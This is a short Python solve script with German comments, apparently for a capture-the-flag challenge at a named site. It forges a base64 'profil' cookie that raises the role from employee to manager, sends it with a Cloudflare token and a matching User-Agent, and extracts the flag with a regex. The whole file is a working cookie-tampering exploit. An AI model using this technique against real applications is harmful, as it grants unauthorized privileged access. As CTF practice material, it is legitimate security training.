#!/usr/bin/env python3
# solve.py — Level 0: der deterministische Exploit (kein LLM).
#
# Prinzip, auf das alles aufbaut:
#   - Forge:  ein manipuliertes profil-Cookie (role employe -> manager)
#   - Oracle: eine Regex entscheidet als EINZIGE, ob es geklappt hat
#
# Gegen die echte Challenge braucht es cf_clearance + passenden User-Agent
# (Cloudflare bindet das Token an IP+UA). Hier als CLI-Argument, nie hartkodiert.
#
#   python3 solve.py "<cf_clearance>"

import sys, base64, re, requests

TARGET = "https://pointeuse.cyberzerk.fr/"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")

cf = sys.argv[1] if len(sys.argv) > 1 else ""

# Der Exploit — hier noch hartkodiert (Level 0):
forged = base64.b64encode(b'{"employe":"Vous (#8472)","role":"manager"}').decode()

r = requests.get(TARGET, headers={"User-Agent": UA},
                 cookies={"cf_clearance": cf, "profil": forged})

# Das Oracle: das einzige, das "funktioniert hat" sagen darf.
m = re.search(r"CyberZerk\{.*?\}", r.text)
print(m.group() if m else "kein Flag — cf_clearance abgelaufen / UA falsch / Exploit falsch")
